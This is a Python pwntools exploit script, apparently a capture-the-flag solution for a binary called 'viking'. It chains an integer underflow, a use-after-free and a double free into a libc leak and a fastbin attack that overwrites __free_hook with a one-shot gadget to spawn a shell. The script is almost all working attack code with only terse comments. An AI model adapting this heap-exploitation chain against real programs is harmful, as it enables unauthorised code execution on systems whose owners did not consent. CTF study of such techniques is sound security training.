from pwn import *

bss = 0x603048

def drop(item):
	r.sendlineafter('Name\n', '2')
	r.sendlineafter('Back\n', '3')
	r.sendlineafter('drop : ', str(item))
	return

def quest(data):
	r.sendlineafter('Name\n', '3')
	r.sendafter('log : ', data)
	return

def edit(data):
	r.sendlineafter('Name\n', '6')
	r.sendafter('name : ', data)
	return

def south():
	r.sendlineafter('Name\n', '1')
	r.sendlineafter('back\n', '2')
	return

def run():
	south()
	r.sendlineafter('away\n', '2')
	return

# Claw
def attack():
	south()
	r.sendlineafter('away\n', '1')
	return

def show():
	r.sendlineafter('Name\n', '2')
	r.sendlineafter('Back\n', '2')
	return

def leak():
	show()
	r.recvuntil('3. ')
	return u64(r.recv(6).ljust(8, chr(0)))

def load():
	r.sendlineafter('Name\n', '5')
	return

def axe():
	r.sendlineafter('Name\n', '1')
	r.sendlineafter('back\n', '1')
	return

def drop(item):
	r.sendlineafter('Name\n', '2')
	r.sendlineafter('Back\n', '3')
	r.sendlineafter('drop : ', str(item))
	return

def pwn():

	r.sendlineafter('quest ?\n', 'y')
	r.sendlineafter('you : ', 'kek')

	# Integer underflow the demon's HP in order to
	# to pick up a claw. When that happens, the program makes
	# an allocation of size 0xc8, which we will use later on
	# to leak libc since the rest of the chunks are of fast sized.
	for i in xrange(8):
		run()

	# This chunk will be treated as chunk no.3
	attack()
	# chunk no.4
	axe()
	# chunk no.5
	axe()

	# Trigger UAF & free chunk 4 and 5.
	load()

	libc    = leak() - 0x3c4b78
	fhook   = libc + 0x3c67a8
	oneshot = libc + 0x4526a
	log.success('Libc: 0x{:x}'.format(libc))
	
	# Trigger double-free 
	# 4 --> 5 --> 4
	drop(4)
	
	# Make our HP of size 0x28 in order to perform fastbin
	# attack on it and overwrite the name pointer.
	attack()
	attack()

	# Get back chunk no.4 and overwrite its FD.
	# 5 --> 4 --> bss
	quest(p64(bss))

	# Get back chunk no.5
	axe()
	# Get back chunk no.4
	axe()

	# Get back bss chunk and overwrite name pointer with __free_hook.
	quest(p64(fhook))
	# __free_hook => one shot gadget
	edit(p64(oneshot))
	# Trigger __free_hook
	drop(4)	
	
	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('',)
        pwn()
    else:
        r = process('./viking')
        pause()
        pwn()
